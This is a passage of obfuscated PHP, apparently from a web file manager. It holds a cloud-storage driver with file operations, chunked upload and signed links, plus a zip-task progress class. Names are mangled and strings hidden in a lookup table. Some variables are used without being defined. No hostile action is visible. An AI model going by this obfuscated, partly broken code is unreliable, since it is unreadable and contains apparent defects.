$this->getPathOuter($ÇøÂÜ“Ê) : !1; } public function copyFile($éçëÄ‡ö, $ÀõñÁ¶¹) { $èÙ¶ÑÇ— =& $_SERVER[íû‘ş´]; $ê­øŸÁÇ = array($èÙ¶ÑÇ—[1503] . "\57{$this->bucket}\x2f{$éçëÄ‡ö}", $èÙ¶ÑÇ—[1504]); $¹ùÔ‰«È = $this->ussRequest($ÀõñÁ¶¹, $èÙ¶ÑÇ—[243], !1, $ê­øŸÁÇ); return $¹ùÔ‰«È[$èÙ¶ÑÇ—[1270]] ? !0 : $this->getPathOuter($ÀõñÁ¶¹); } public function moveFile($õ¥›ëÁƒ, $ìÉÂ§šò) { $ä¦¾äÕ‘ =& $_SERVER[íû‘ş´]; $œîó½ìé = array($ä¦¾äÕ‘[1505] . "\57{$this->bucket}\57{$õ¥›ëÁƒ}", $ä¦¾äÕ‘[1504]); $İ¶ úâø = $this->ussRequest($ìÉÂ§šò, $ä¦¾äÕ‘[243], !1, $œîó½ìé); return $İ¶ úâø[$ä¦¾äÕ‘[1270]] ? !0 : $this->getPathOuter($ìÉÂ§šò); } public function delFile($œâ‰ô¸›) { $ë¹¶òí± =& $_SERVER[íû‘ş´]; $­â—€ò¢ = $this->ussRequest($œâ‰ô¸›, $ë¹¶òí±[1506]); return $­â—€ò¢[$ë¹¶òí±[1270]] ? !0 : !1; } public function delFolder($åÒëøÁË) { $¶ÃÒƒøï =& $_SERVER[íû‘ş´]; if (!$this->exist($åÒëøÁË)) { return !0; } $this->listItemCache = !1; $ñ¸İõÑ = $ÍğıÅ ¯ = array(); $this->fileList($åÒëøÁË, $ñ¸İõÑ, $ÍğıÅ ¯, !0); $this->listItemCache = !0; foreach ($ÍğıÅ ¯ as $ş‚‰Å¶¶) { $íÃ¯ĞÛ› = $this->ussRequest($ş‚‰Å¶¶[$¶ÃÒƒøï[32]], $¶ÃÒƒøï[1506]); if (!$íÃ¯ĞÛ›[$¶ÃÒƒøï[1270]]) { return !1; } } foreach ($ñ¸İõÑ as $Ãï©§Š) { $íÃ¯ĞÛ› = $this->ussRequest($Ãï©§Š, $¶ÃÒƒøï[1506]); if (!$íÃ¯ĞÛ›[$¶ÃÒƒøï[1270]]) { return !1; } } $íÃ¯ĞÛ› = $this->ussRequest($åÒëøÁË, $¶ÃÒƒøï[1506]); return $íÃ¯ĞÛ›[$¶ÃÒƒøï[1270]]; } public function rename($››àğ¯, $¹Ç³À) { if ($this->isFile($››àğ¯)) { $¹Ç³À = get_path_father($››àğ¯) . $¹Ç³À; return $this->moveFile($››àğ¯, $¹Ç³À); } return $this->renameObject($››àğ¯, $¹Ç³À); } public function fileInfo($¡Ç½¡Òô, $ í–í¦„ = false, $¾ÏŞ¼×˜ = array()) { $îÉ¶ƒ¡â =& $_SERVER[íû‘ş´]; $ñú’ãÄ± = array($îÉ¶ƒ¡â[32] => $this->pathThis($¡Ç½¡Òô), $îÉ¶ƒ¡â[84] => $this->getPathOuter($îÉ¶ƒ¡â[8] . $¡Ç½¡Òô), $îÉ¶ƒ¡â[33] => $îÉ¶ƒ¡â[214], $îÉ¶ƒ¡â[76] => isset($¾ÏŞ¼×˜[$îÉ¶ƒ¡â[76]]) ? $¾ÏŞ¼×˜[$îÉ¶ƒ¡â[76]] : 0, $îÉ¶ƒ¡â[175] => $this->ext($¡Ç½¡Òô)); if ($ í–í¦„) { return $ñú’ãÄ±; } $ñú’ãÄ±[$îÉ¶ƒ¡â[215]] = $ñú’ãÄ±[$îÉ¶ƒ¡â[85]] = 0; $ñú’ãÄ±[$îÉ¶ƒ¡â[216]] = $ñú’ãÄ±[$îÉ¶ƒ¡â[217]] = !0; if (empty($¾ÏŞ¼×˜)) { $¾ÏŞ¼×˜ = $this->objectMeta($¡Ç½¡Òô); if (!$¾ÏŞ¼×˜) { return $ñú’ãÄ±; } } $ñú’ãÄ±[$îÉ¶ƒ¡â[215]] = intval($¾ÏŞ¼×˜[$îÉ¶ƒ¡â[1507]]); $ñú’ãÄ±[$îÉ¶ƒ¡â[85]] = intval($¾ÏŞ¼×˜[$îÉ¶ƒ¡â[1508]]); $ñú’ãÄ±[$îÉ¶ƒ¡â[76]] = $¾ÏŞ¼×˜[$îÉ¶ƒ¡â[76]]; return $ñú’ãÄ±; } public function folderInfo($Û—Œ„øğ, $øøÁ¦ùĞ = false) { $¿ôäí•‘ =& $_SERVER[íû‘ş´]; $±Ï¤÷Î« = array($¿ôäí•‘[32] => $this->pathThis($Û—Œ„øğ), $¿ôäí•‘[84] => $this->getPathOuter($¿ôäí•‘[8] . $Û—Œ„øğ), $¿ôäí•‘[33] => $¿ôäí•‘[75]); if ($øøÁ¦ùĞ) { return $±Ï¤÷Î«; } $±Ï¤÷Î«[$¿ôäí•‘[215]] = $±Ï¤÷Î«[$¿ôäí•‘[85]] = 0; $±Ï¤÷Î«[$¿ôäí•‘[216]] = $±Ï¤÷Î«[$¿ôäí•‘[217]] = !0; if (empty($êêü•Å·)) { $êêü•Å· = $this->objectMeta($Û—Œ„øğ); if (!$êêü•Å·) { return $±Ï¤÷Î«; } } $±Ï¤÷Î«[$¿ôäí•‘[215]] = intval($êêü•Å·[$¿ôäí•‘[1507]]); $±Ï¤÷Î«[$¿ôäí•‘[85]] = intval($êêü•Å·[$¿ôäí•‘[1508]]); return $±Ï¤÷Î«; } private function listObjs($³¾ìïÚ™, $ËÓ°Í˜— = 0, $Ÿ˜»‚™ = 1000) { $„ç¼óÜ„ =& $_SERVER[íû‘ş´]; $Óóõ¼ÑÜ = array($„ç¼óÜ„[1509], $„ç¼óÜ„[1510] . $Ÿ˜»‚™); if ($ËÓ°Í˜—) { $Óóõ¼ÑÜ[] = $„ç¼óÜ„[1511] . $ËÓ°Í˜—; } $ìª¬Ó¯ = $this->ussRequest($³¾ìïÚ™, $„ç¼óÜ„[245], !1, $Óóõ¼ÑÜ); return !$ìª¬Ó¯[$„ç¼óÜ„[1270]] ? !1 : $ìª¬Ó¯[$„ç¼óÜ„[1260]]; } private function fileList($Øå™˜ªÑ, &$¾´‡ºà¨, &$ï©´Ó‹•, $”ØÛ´íñ = false) { $€Øİ…î¬ =& $_SERVER[íû‘ş´]; $ûï¼×Õ‰ = $€Øİ…î¬[12]; $ œ†úŸ¶ = 1000; $é”¥ï«Ÿ = rtrim($Øå™˜ªÑ, $€Øİ…î¬[8]) . $€Øİ…î¬[8]; while (!0) { check_abort(); $®å¼ô = $this->listObjs($Øå™˜ªÑ, $ûï¼×Õ‰, $ œ†úŸ¶); if (!$®å¼ô) { return !1; } $ûï¼×Õ‰ = isset($®å¼ô[$€Øİ…î¬[1512]]) ? $®å¼ô[$€Øİ…î¬[1512]] : $€Øİ…î¬[12]; $¸İúõĞÌ = isset($®å¼ô[$€Øİ…î¬[1513]]) ? $®å¼ô[$€Øİ…î¬[1513]] : array(); foreach ($¸İúõĞÌ as $‘ˆäŸÖ·) { $Í¨Ç‡ş… = $‘ˆäŸÖ·[$€Øİ…î¬[33]] == $€Øİ…î¬[75] ? !0 : !1; $é÷³…° = ltrim($é”¥ï«Ÿ . $‘ˆäŸÖ·[$€Øİ…î¬[32]], $€Øİ…î¬[8]) . ($Í¨Ç‡ş… ? $€Øİ…î¬[8] : $€Øİ…î¬[12]); $ŠòìÕ—É = array($€Øİ…î¬[32] => $é÷³…°, $€Øİ…î¬[33] => $Í¨Ç‡ş… ? $€Øİ…î¬[75] : $€Øİ…î¬[214], $€Øİ…î¬[76] => $‘ˆäŸÖ·[$€Øİ…î¬[381]], $€Øİ…î¬[1508] => $‘ˆäŸÖ·[$€Øİ…î¬[1514]]); $this->cacheMethodInfoSet($é÷³…°, $Í¨Ç‡ş…, $ŠòìÕ—É); if ($Í¨Ç‡ş…) { $¾´‡ºà¨[] = $é÷³…°; if ($”ØÛ´íñ) { $this->fileList($é÷³…°, $¾´‡ºà¨, $ï©´Ó‹•, $”ØÛ´íñ); } continue; } $ï©´Ó‹•[] = $ŠòìÕ—É; } if (count($¸İúõĞÌ) < $ œ†úŸ¶) { break; } } $this->cacheMethodInfoSet($Øå™˜ªÑ, !0); } public function listPath($µø´’ , $±©ÀñÛÄ = false) { $áÊ²÷¿ =& $_SERVER[íû‘ş´]; $™†®æåı = $­Ù¬éş = array(); $this->fileList($µø´’ , $™†®æåı, $­Ù¬éş); foreach ($™†®æåı as $åÄ Œ³ => $ğÒû×¥…) { $™†®æåı[$åÄ Œ³] = $this->folderInfo($ğÒû×¥…, $±©ÀñÛÄ); } foreach ($­Ù¬éş as $åÄ Œ³ => $ğÒû×¥…) { $­Ù¬éş[$åÄ Œ³] = $this->fileInfo($ğÒû×¥…[$áÊ²÷¿[32]], $±©ÀñÛÄ, $ğÒû×¥…); } return array($áÊ²÷¿[82] => $™†®æåı, $áÊ²÷¿[83] => $­Ù¬éş); } public function has($¾ƒ¤Ş¾, $¶óÒÍß = false, $¿Ö—¼¬ü = true) { $ƒà›€¤ =& $_SERVER[íû‘ş´]; $ŠËÑó—ü = $ƒà›€¤[12]; $¶¹ °¹ˆ = 500; $‰ªÎíÌÖ = 0; $ó½õòØ× = 0; $‘¶óæ¼“ = rtrim($¾ƒ¤Ş¾, $ƒà›€¤[8]) . $ƒà›€¤[8]; while (!0) { check_abort(); $Òëƒ½ó³ = $this->listObjs($¾ƒ¤Ş¾, $ŠËÑó—ü, $¶¹ °¹ˆ); if (!$Òëƒ½ó³) { return !1; } $ŠËÑó—ü = isset($Òëƒ½ó³[$ƒà›€¤[1512]]) ? $Òëƒ½ó³[$ƒà›€¤[1512]] : $ƒà›€¤[12]; $‹Ù­’©• = isset($Òëƒ½ó³[$ƒà›€¤[1513]]) ? $Òëƒ½ó³[$ƒà›€¤[1513]] : array(); if (empty($‹Ù­’©•)) { break; } $™¹²õ±ç = array_filter($‹Ù­’©•, function ($¤ŸİÙÂï) { $×ı’¿¦ù =& $_SERVER[íû‘ş´]; return $¤ŸİÙÂï[$×ı’¿¦ù[33]] == $×ı’¿¦ù[75]; }); $¢ÚìØİ¾ = count($‹Ù­’©•); $™¹²õ±ç = count($™¹²õ±ç); $§²¾äÕ› = $¢ÚìØİ¾ - $™¹²õ±ç; if ($¶óÒÍß) { $ó½õòØ× += $™¹²õ±ç; $‰ªÎíÌÖ += $§²¾äÕ›; if ($¢ÚìØİ¾ < $¶¹ °¹ˆ) { break; } continue; } if ($¿Ö—¼¬ü) { if ($§²¾äÕ›) { return !0; } } else { if ($™¹²õ±ç) { return !0; } } if ($¢ÚìØİ¾ < $¶¹ °¹ˆ) { break; } } if ($¶óÒÍß) { return array($ƒà›€¤[223] => $‰ªÎíÌÖ, $ƒà›€¤[224] => $ó½õòØ×); } return !1; } public function listAll($ï™É ¡­) { $±è¦†¬Ü =& $_SERVER[íû‘ş´]; $´ß˜øù = $àÑÒ¿¸£ = array(); $this->fileList($ï™É ¡­, $´ß˜øù, $àÑÒ¿¸£, !0); $‰÷Ñ˜Ã¡ = array_to_keyvalue($àÑÒ¿¸£, $±è¦†¬Ü[32]); foreach ($´ß˜øù as $‹‘¹×¶ê) { if (is_string($‹‘¹×¶ê)) { $‰÷Ñ˜Ã¡[$‹‘¹×¶ê] = array($±è¦†¬Ü[76] => 0); } } return $this->listAllFiles($ï™É ¡­, $‰÷Ñ˜Ã¡); } public function canRead($¸ÑÆ¦¹) { return $this->exist($¸ÑÆ¦¹) ? !0 : !1; } public function canWrite($•¦ªÚØ ) { return $this->exist($•¦ªÚØ ) ? !0 : !1; } public function getContent($ÔÉÎ®ï) { return $this->fileSubstr($ÔÉÎ®ï, 0, -1); } public function setContent($ÏÕ¹Êâ, $óÜ§ü©È = '') { $ñ™œŒôÄ =& $_SERVER[íû‘ş´]; if (!$óÜ§ü©È) { $Èá†»Ûõ = $this->ussRequest($ÏÕ¹Êâ, $ñ™œŒôÄ[241]); return $Èá†»Ûõ[$ñ™œŒôÄ[1270]]; } $Ãã£›å¯ = $this->tempFile($this->pathThis($ÏÕ¹Êâ)); file_put_contents($Ãã£›å¯, $óÜ§ü©È); if ($this->upload($ÏÕ¹Êâ, $Ãã£›å¯)) { $this->tempFileRemve($Ãã£›å¯); return !0; } return !1; } public function fileSubstr($œ­ÎºÓª, $Ïß¿‰—°, $¶á»¿³) { $îÑïèğÃ =& $_SERVER[íû‘ş´]; if (!($¶ä× = $this->link($œ­ÎºÓª))) { return !1; } $ôÅˆÚøİ = !1; if ($¶á»¿³ > 0) { $®œàè = $Ïß¿‰—° + $¶á»¿³ - 1; $ôÅˆÚøİ = array($îÑïèğÃ[1475] . $Ïß¿‰—° . $îÑïèğÃ[430] . $®œàè); } $³ª¼èöã = url_request($¶ä×, $îÑïèğÃ[245], !1, $ôÅˆÚøİ); return $³ª¼èöã[$îÑïèğÃ[809]] ? $³ª¼èöã[$îÑïèğÃ[1260]] : !1; } public function upload($×ø¦ú°Ñ, $Ğ¢ÌöÄ, $îšÙÀ“ = false, $‰ø”ÜÑÂ = REPEAT_REPLACE) { $›­•šÌ =& $_SERVER[íû‘ş´]; $ÔÉ®Í½· = IO::size($Ğ¢ÌöÄ); if ($ÔÉ®Í½· <= 1024 * 1024 * 200) { $ùÍ–‘ªî = array($›­•šÌ[1515] . $Ğ¢ÌöÄ); $ÀÇôÃ  = $this->ussRequest($×ø¦ú°Ñ, $›­•šÌ[243], $ùÍ–‘ªî); return $ÀÇôÃ [$›­•šÌ[1270]] ? $this->getPathOuter($×ø¦ú°Ñ) : !1; } $ÙØ¹ê…ã = 1024 * 1024 * 10; $âÓºì‡˜ = array($›­•šÌ[1516], $›­•šÌ[1517] . $ÔÉ®Í½·, $›­•šÌ[1518], $›­•šÌ[1519] . $ÙØ¹ê…ã); $ÀÇôÃ  = $this->ussRequest($×ø¦ú°Ñ, $›­•šÌ[243], !1, $âÓºì‡˜); if (!$ÀÇôÃ [$›­•šÌ[1270]]) { return !1; } $şÌÓ£ˆƒ = $ÀÇôÃ [$›­•šÌ[1260]]; $©¼¡üÖâ = 0; $ÊÍ»Ğöã = $şÌÓ£ˆƒ[$›­•šÌ[1520]]; $¢é×Ö– = fopen($Ğ¢ÌöÄ, $›­•šÌ[1424]); if (!$¢é×Ö–) { return !1; } do { $Éîºìë = $şÌÓ£ˆƒ[$›­•šÌ[1521]]; fseek_64($¢é×Ö–, $©¼¡üÖâ); $ä¬š¹ÈÉ = fread($¢é×Ö–, $Éîºìë); $ş‰ëÒÈğ = 0; do { $ş‰ëÒÈğ++; $şÌÓ£ˆƒ = $this->uploadPart($×ø¦ú°Ñ, $şÌÓ£ˆƒ, $ä¬š¹ÈÉ); } while (!$şÌÓ£ˆƒ && $ş‰ëÒÈğ < 3); if (!$şÌÓ£ˆƒ) { return !1; } $ÊÍ»Ğöã = $şÌÓ£ˆƒ[$›­•šÌ[1520]]; $©¼¡üÖâ += $Éîºìë; } while ($ÊÍ»Ğöã != -1); fclose($¢é×Ö–); $âÓºì‡˜ = array($›­•šÌ[1522], $›­•šÌ[1523] . $şÌÓ£ˆƒ[$›­•šÌ[1524]], $›­•šÌ[1518]); $ÀÇôÃ  = $this->ussRequest($×ø¦ú°Ñ, $›­•šÌ[243], !1, $âÓºì‡˜); return $ÀÇôÃ [$›­•šÌ[1270]] ? $this->getPathOuter($š—Ö±ù) : !1; } private function uploadPart($Ááë‚ÚÂ, $Æà¢ÂÆ, &$è×Ììâƒ) { $ÔâïêŸú =& $_SERVER[íû‘ş´]; $âÏÅÑ‰‘ = array($ÔâïêŸú[1525], $ÔâïêŸú[1523] . $Æà¢ÂÆ[$ÔâïêŸú[1524]], $ÔâïêŸú[1526] . $Æà¢ÂÆ[$ÔâïêŸú[1520]], $ÔâïêŸú[143] . $Æà¢ÂÆ[$ÔâïêŸú[1521]]); $¤âŒÒ¶ƒ = $this->ussRequest($Ááë‚ÚÂ, $ÔâïêŸú[243], $è×Ììâƒ, $âÏÅÑ‰‘); return !$¤âŒÒ¶ƒ[$ÔâïêŸú[1270]] ? $¤âŒÒ¶ƒ[$ÔâïêŸú[1270]] : $¤âŒÒ¶ƒ[$ÔâïêŸú[1260]]; } public function uploadFormData($Ñ£ĞÂÒ, $’ë×ØÑ = 3600) { return $this->uploadPolicy($Ñ£ĞÂÒ, $’ë×ØÑ); } public function multiUploadFormData($²èş’Â, $”Ğõ™êÆ = 3600) { $¹ö‰½Óæ =& $_SERVER[íû‘ş´]; $ÉÆõÁñÂ = (int) $GLOBALS[$¹ö‰½Óæ[7]][$¹ö‰½Óæ[76]]; return $this->uploadPolicy($²èş’Â, $”Ğõ™êÆ, $ÉÆõÁñÂ); } private function uploadPolicy($òâ…Í¾, $øğå¥­ó = 3600, $Ë¯òØÁü = 0) { $©ì”×Ê =& $_SERVER[íû‘ş´]; $°¡¾—€ = $©ì”×Ê[8] . $this->bucket; $ö‚˜å¹ú = gmdate($©ì”×Ê[1460]); $…ˆíºÛ” = array($©ì”×Ê[1527] => $this->bucket, $©ì”×Ê[1528] => $òâ…Í¾, $©ì”×Ê[1529] => time() + $øğå¥­ó, $©ì”×Ê[1530] => $ö‚˜å¹ú); if ($Ë¯òØÁü) { $…ˆíºÛ”[$©ì”×Ê[1441]] = $Ë¯òØÁü; } $ù¢Ö ° = base64_encode(json_encode($…ˆíºÛ”)); $¬Ò¥‡¹ú = base64_encode(hash_hmac($©ì”×Ê[1497], "\x50\x4f\123\124\46{$°¡¾—€}\x26{$ö‚˜å¹ú}\x26{$ù¢Ö °}", md5("{$this->userpass}"), !0)); $Şï„ÀÓ = array($©ì”×Ê[276] => $ù¢Ö °, $©ì”×Ê[1531] => "\125\x50\x59\125\116\x20{$this->username}\x3a{$¬Ò¥‡¹ú}", $©ì”×Ê[196] => $this->endpoint . $°¡¾—€); return $Şï„ÀÓ; } public function download($ñÇ‚Ñ½Ù, $ƒÃÅÕàÌ) { $‰Ãö¾ = IO::getPathInner(IO::mkfile($ƒÃÅÕàÌ)); if (!($Òµ Éú = $this->link($ñÇ‚Ñ½Ù))) { return !1; } $Ù³Ù´Îá = 0; $Ï­ Šøé = 1024 * 200; $¨†¯Ê = fopen($‰Ãö¾, $_SERVER[íû‘ş´][1481]); while (!0) { $ˆäüÏ¢ = $this->fileSubstr($ñÇ‚Ñ½Ù, $Ù³Ù´Îá, $Ï­ Šøé); if ($ˆäüÏ¢ === !1) { return !1; } fwrite($¨†¯Ê, $ˆäüÏ¢); $Ù³Ù´Îá += $Ï­ Šøé; if (strlen($ˆäüÏ¢) < $Ï­ Šøé) { break; } } fclose($¨†¯Ê); return $ƒÃÅÕàÌ; } public function link($‡ùë§ÓÔ, $˜‰·”ù = array()) { $Æü¡í»Û =& $_SERVER[íû‘ş´]; $‡ùë§ÓÔ = trim($‡ùë§ÓÔ, $Æü¡í»Û[8]); if (!empty($this->token)) { $Å½ÍñÂ = strtotime(date($Æü¡í»Û[1532])); $”²ñŒ•º = substr(md5($this->token . $Æü¡í»Û[328] . $Å½ÍñÂ . $Æü¡í»Û[1533] . $‡ùë§ÓÔ), 12, 8) . $Å½ÍñÂ; $˜‰·”ù[] = $Æü¡í»Û[1534] . $”²ñŒ•º; } $¾œÒì«´ = !empty($˜‰·”ù) ? $Æü¡í»Û[73] . implode($Æü¡í»Û[328], $˜‰·”ù) : $Æü¡í»Û[12]; return $this->getHost() . $Æü¡í»Û[8] . $‡ùë§ÓÔ . $¾œÒì«´; } public function fileOut($ªê§¯øá, $À¯íùÔƒ = false, $àˆ·Ş¨° = false, $Å´ÎÀÎÅ = '') { if ($this->isFileOutServer()) { return $this->fileOutServer($ªê§¯øá, $À¯íùÔƒ, $àˆ·Ş¨°, $Å´ÎÀÎÅ); } if (!$àˆ·Ş¨°) { $àˆ·Ş¨° = $this->pathThis($ªê§¯øá); } $Öµ˜Ì³ = $À¯íùÔƒ ? array($_SERVER[íû‘ş´][1535] . rawurlencode($àˆ·Ş¨°)) : array(); $üÊŒá®ï = $this->link($ªê§¯øá, $Öµ˜Ì³); $this->fileOutLink($üÊŒá®ï); } public function fileOutServer($·¦Õö ¨, $²¨ã¤§­ = false, $Şç×ÏçÔ = false, $ÂÉ­¥ÄÛ = '') { parent::fileOut($·¦Õö ¨, $²¨ã¤§­, $Şç×ÏçÔ, $ÂÉ­¥ÄÛ); } public function fileOutImage($úÆ¶—ÊÚ, $•¹…× = 250) { $÷ØøØØ = $this->link($úÆ¶—ÊÚ . $_SERVER[íû‘ş´][1536] . $•¹…×); $this->fileOutLink($÷ØøØØ); } public function fileOutImageServer($õó»õŞÆ, $•€Î®§ƒ = 250) { parent::fileOutImage($õó»õŞÆ, $•€Î®§ƒ); } public function hashMd5($¹Ô–Œì) { $ÒÆŠ¨ë =& $_SERVER[íû‘ş´]; $ïÂÕì´ø = $this->_objectMeta($¹Ô–Œì); return isset($ïÂÕì´ø[$ÒÆŠ¨ë[228]]) ? $ïÂÕì´ø[$ÒÆŠ¨ë[228]] : !1; } public function size($‰ùï‘üí) { $Ù”‘™üƒ = $this->objectMeta($‰ùï‘üí); return $Ù”‘™üƒ ? $Ù”‘™üƒ[$_SERVER[íû‘ş´][76]] : 0; } public function info($õáĞßŸ) { if ($this->isFolder($õáĞßŸ)) { return $this->folderInfo($õáĞßŸ); } else { if ($this->isFile($õáĞßŸ)) { return $this->fileInfo($õáĞßŸ); } } return !1; } public function exist($ªÖ¹›Á²) { return $this->isFile($ªÖ¹›Á²) || $this->isFolder($ªÖ¹›Á²); } public function isFile($•¶ªÔÏº) { return !$this->isFolder($•¶ªÔÏº) && $this->objectMeta($•¶ªÔÏº); } public function isFolder($ò…‚‘ò) { return $this->cacheMethod($_SERVER[íû‘ş´][166], $ò…‚‘ò); } protected function objectMeta($¿ê…©¬¹) { return $this->cacheMethod($_SERVER[íû‘ş´][168], $¿ê…©¬¹); } protected function _objectMeta($¹Ôªóîˆ) { $ÑÅî˜˜Ş =& $_SERVER[íû‘ş´]; if ($¹Ôªóîˆ == $ÑÅî˜˜Ş[12] || $¹Ôªóîˆ == $ÑÅî˜˜Ş[8]) { return array(); } $˜¬ù¯— = $this->ussRequest($¹Ôªóîˆ, $ÑÅî˜˜Ş[1537]); if (!$˜¬ù¯—[$ÑÅî˜˜Ş[1270]]) { return null; } $Šû²ÂËà = isset($˜¬ù¯—[$ÑÅî˜˜Ş[1260]]) ? $˜¬ù¯—[$ÑÅî˜˜Ş[1260]] : array(); if (!isset($Šû²ÂËà[$ÑÅî˜˜Ş[1538]])) { return null; } $„¦çùş = array($ÑÅî˜˜Ş[33] => isset($Šû²ÂËà[$ÑÅî˜˜Ş[1538]]) ? $Šû²ÂËà[$ÑÅî˜˜Ş[1538]] : null, $ÑÅî˜˜Ş[76] => isset($Šû²ÂËà[$ÑÅî˜˜Ş[1539]]) ? $Šû²ÂËà[$ÑÅî˜˜Ş[1539]] : null, $ÑÅî˜˜Ş[228] => isset($Šû²ÂËà[$ÑÅî˜˜Ş[1540]]) ? $Šû²ÂËà[$ÑÅî˜˜Ş[1540]] : null, $ÑÅî˜˜Ş[1507] => isset($Šû²ÂËà[$ÑÅî˜˜Ş[1541]]) ? $Šû²ÂËà[$ÑÅî˜˜Ş[1541]] : null); $„¦çùş[$ÑÅî˜˜Ş[1508]] = isset($Šû²ÂËà[$ÑÅî˜˜Ş[1542]]) ? strtotime($Šû²ÂËà[$ÑÅî˜˜Ş[1542]]) : $„¦çùş[$ÑÅî˜˜Ş[1507]]; return $„¦çùş; } protected function _isFolder($í—ÁÚù¬) { $­é«×Ïé =& $_SERVER[íû‘ş´]; if ($í—ÁÚù¬ == $­é«×Ïé[12] || $í—ÁÚù¬ == $­é«×Ïé[8]) { return !0; } $š¸ë›¤Ü = $this->_objectMeta($í—ÁÚù¬); return isset($š¸ë›¤Ü[$­é«×Ïé[33]]) && $š¸ë›¤Ü[$­é«×Ïé[33]] == $­é«×Ïé[75] ? !0 : !1; } } goto CŞ­ÔÙã®è; F…èï®’: class TaskZip extends TaskFileTransfer { protected function startAfter() { $û¹ÛÆÊ® =& $_SERVER[íû‘ş´]; parent::startAfter(); Hook::bind($û¹ÛÆÊ®[1829], array($this, $û¹ÛÆÊ®[1819])); Hook::bind($û¹ÛÆÊ®[1821], array($this, $û¹ÛÆÊ®[1822])); $ŞÄö›ïú =& $this->task; $ŞÄö›ïú[$û¹ÛÆÊ®[1823]] = $û¹ÛÆÊ®[1252]; if (!$ŞÄö›ïú[$û¹ÛÆÊ®[1599]]) { $ŞÄö›ïú[$û¹ÛÆÊ®[1599]] = LNG($û¹ÛÆÊ®[1830]); } } protected function endAfter() { $ãÔ¤Áˆ© =& $_SERVER[íû‘ş´]; parent::endAfter(); Hook::unbind($ãÔ¤Áˆ©[1829], array($this, $ãÔ¤Áˆ©[1819])); Hook::unbind($ãÔ¤Áˆ©[1821], array($this, $ãÔ¤Áˆ©[1822])); } public function updateAfter() { $ğ…æ´¹ä =& $_SERVER[íû‘ş´]; $ø©÷Èïœ =& $this->task; if (!$ø©÷Èïœ[$ğ…æ´¹ä[845]] || !$ø©÷Èïœ[$ğ…æ´¹ä[822]]) { return; } if ($ø©÷Èïœ[$ğ…æ´¹ä[1823]] == $ğ…æ´¹ä[1252]) { $Ÿ·¦Õ = $ø©÷Èïœ[$ğ…æ´¹ä[1759]]; if ($ø©÷Èïœ[$ğ…æ´¹ä[1760]] != $ğ…æ´¹ä[1252]) { $Ÿ·¦Õ = 0; } $Î …ğ  = ($ø©÷Èïœ[$ğ…æ´¹ä[1763]] + $Ÿ·¦Õ) / $ø©÷Èïœ[$ğ…æ´¹ä[822]]; $ø©÷Èïœ[$ğ…æ´¹ä[1707]] = $Î …ğ  * 0.3; } else { if ($ø©÷Èïœ[$ğ…æ´¹ä[1823]] == $ğ…æ´¹ä[357]) { $Î …ğ  = $ø©÷Èïœ[$ğ…æ´¹ä[1706]] / $ø©÷Èïœ[$ğ…æ´¹ä[845]]; $ø©÷Èïœ[$ğ…æ´¹ä[1707]] = 0.3 + $Î …ğ  * 0.5; } else { if ($ø©÷Èïœ[$ğ…æ´¹ä[1823]] == $ğ…æ´¹ä[107]) { $Î …ğ  = 0; if ($ø©÷Èïœ[$ğ…æ´¹ä[1758]]) { $Î …ğ  = $ø©÷Èïœ[$ğ…æ´¹ä[1759]] / $ø©÷Èïœ[$ğ…æ´¹ä[1758]]; } $ø©÷Èïœ[$ğ…æ´¹ä[1707]] = 0.3 + 0.5 + $Î …ğ  * 0.2; } } } if ($ø©÷Èïœ[$ğ…æ´¹ä[1707]] > 0) { $“´ß›ü  = timeFloat() - $ø©÷Èïœ[$ğ…æ´¹ä[1709]] - $ø©÷Èïœ[$ğ…æ´¹ä[1712]]; $ø©÷Èïœ[$ğ…æ´¹ä[1713]] = $“´ß›ü  * (1 - $ø©÷Èïœ[$ğ…æ´¹ä[1707]]) / $ø©÷Èïœ[$ğ…æ´¹ä[1707]]; } } public function copyFileStart($‰Ê’éúä, $üÓ…€Ê®, $ŸûÍã –, $Ä‡¡¢–ğ, $î—¥õÁÒ, $–Ø™‡û) { $ğòùŠŠŞ =& $_SERVER[íû‘ş´]; parent::copyFileStart($‰Ê’éúä, $üÓ…€Ê®, $ŸûÍã –, $Ä‡¡¢–ğ, $î—¥õÁÒ, $–Ø™‡û); $óôâœğğ =& $this->task; if ($óôâœğğ[$ğòùŠŠŞ[1823]] == $ğòùŠŠŞ[357]) { $óôâœğğ[$ğòùŠŠŞ[1823]] = $ğòùŠŠŞ[107]; } $this->update(); } public function copyFileEnd($†¯›¸ú¢, $¢íí•˜Ê, $şÁÎ‘ó¹, $’–ş¯Ãì, $“Ÿ›ÖÅ¿, $º«à—º‰) { $œß’ñÌÙ =& $_SERVER[íû‘ş´]; $ºøŠ–ã’ =& $this->task; $ºøŠ–ã’[$œß’ñÌÙ[1759]] = $ºøŠ–ã’[$œß’ñÌÙ[1758]]; $ºøŠ–ã’[$œß’ñÌÙ[1763]] += $ºøŠ–ã’[$œß’ñÌÙ[1758]]; $ºøŠ–ã’[$œß’ñÌÙ[1760]] = $œß’ñÌÙ[12]; $this->update(); } public function zipEvent($„ÊÍÍË†, $üÊ‡˜È°, $Ü¬¢éá“, $¹Œëœà±) { $ì¨îåƒÒ =& $_SERVER[íû‘ş´]; $¼àòíÏí =& $this->task; $¼àòíÏí[$ì¨îåƒÒ[1756]] = get_path_this($üÊ‡˜È°); $¼àòíÏí[$ì¨îåƒÒ[1758]] = $¹Œëœà±; $¼àòíÏí[$ì¨îåƒÒ[1759]] = $Ü¬¢éá“; $¼àòíÏí[$ì¨îåƒÒ[1122]] = $„ÊÍÍË† == $ì¨îåƒÒ[1831] ? $ì¨îåƒÒ[1826] : $ì¨îåƒÒ[1827]; $¼àòíÏí[$ì¨îåƒÒ[1760]] = $ì¨îåƒÒ[12]; $¼àòíÏí[$ì¨îåƒÒ[822]] = $¹Œëœà±; $¼àòíÏí[$ì¨îåƒÒ[1823]] = $ì¨îåƒÒ[357]; $this->update(); } public function nameParse($£ ‘ÜÛÀ) { $Û¤åşÚØ =& $_SERVER[íû‘ş´]; $«˜± ¦± =& $this->task; if ($«˜± ¦±[$Û¤åşÚØ[1706]] < $«˜± ¦±[$Û¤åşÚØ[845]]) { $¢¸šÊ›Æ = get_path_this($£ ‘ÜÛÀ); if (strstr($¢¸šÊ›Æ, $Û¤åşÚØ[10])) { $«˜± ¦±[$Û¤åşÚØ[1706]] += 1; } } if ($«˜± ¦±[$Û¤åşÚØ[1823]] == $Û¤åşÚØ[1252]) { $«˜± ¦±[$Û¤åşÚØ[1823]] = $Û¤åşÚØ[357]; } $«˜± ¦±[$Û¤åşÚØ[1756]] = $£ ‘ÜÛÀ; $this->update(); } } class AnalysisModel extends ModelBaseLight { public function init($é±İı) { $å¤«æĞ¦ =& $_SERVER[íû‘ş´]; 